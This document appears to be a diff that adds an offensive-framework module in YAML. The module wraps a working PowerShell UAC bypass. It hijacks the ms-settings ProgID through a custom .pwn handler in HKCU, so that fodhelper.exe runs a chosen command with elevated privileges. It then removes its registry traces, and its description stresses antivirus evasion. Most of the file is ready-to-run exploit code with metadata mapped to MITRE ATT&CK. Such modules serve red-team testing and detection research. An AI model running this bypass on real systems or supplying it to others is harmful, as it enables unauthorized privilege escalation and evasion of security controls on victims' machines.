@@ -1,0 +1,69 @@
+name: Invoke-FodhelperProgIDs
+authors:
+  - name: ''
+    handle: '@V3ded'
+    link: ''
+  - name: ''
+    handle: '@netbiosX'
+    link: ''
+  - name: ''
+    handle: '@m1m1k4tz'
+    link: ''
+description: |
+  A privilege escalation module that bypasses User Account Control (UAC)
+  by exploiting the Windows Features on Demand Helper (FodHelper.exe)
+  using Programmatic Identifiers (ProgIDs). This technique leverages
+  registry manipulation to redirect FodHelper's execution flow while
+  evading antivirus detection through the use of ProgID entries.
+
+  The module creates a custom file extension (.pwn) and associates it
+  with a command handler in the registry. It then manipulates the
+  ms-settings ProgID to redirect to this custom extension, causing
+  FodHelper.exe to execute the specified command with elevated
+  privileges when it attempts to process the settings request.
+
+  This approach is particularly effective because it uses ProgIDs
+  instead of direct registry key modifications, which helps avoid
+  detection by security tools that monitor for specific registry
+  changes. The technique is based on research by @V3ded and provides
+  a stealthy method of UAC bypass that can evade many antivirus
+  signatures.
+software: ''
+tactics: [TA0004]
+techniques: [T1548.002]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses
+options:
+  - name: Command
+    description: Command to execute
+    required: true
+    value: ''
+script: |
+  function Invoke-FodhelperProgIDs {
+      Param (
+          [String]$Command = ""
+      )
+
+      # Warning: a ProgID entry needs to be located in the HKCR (HKEY_CLASSES_ROOT) hive in order to take effect.
+      #                                                    HKCR = HKLM:\Software\Classes
+      #                                                         = HKCU:\Software\Classes
+      New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+      Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $Command -Force
+
+      New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+      Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+
+      Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
+      Start-Sleep 3
+
+      Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
+      Remove-Item "HKCU:\Software\Classes\.pwn\" -Recurse -Force
+  }
+script_end: Invoke-FodhelperProgIDs {{ PARAMS }}
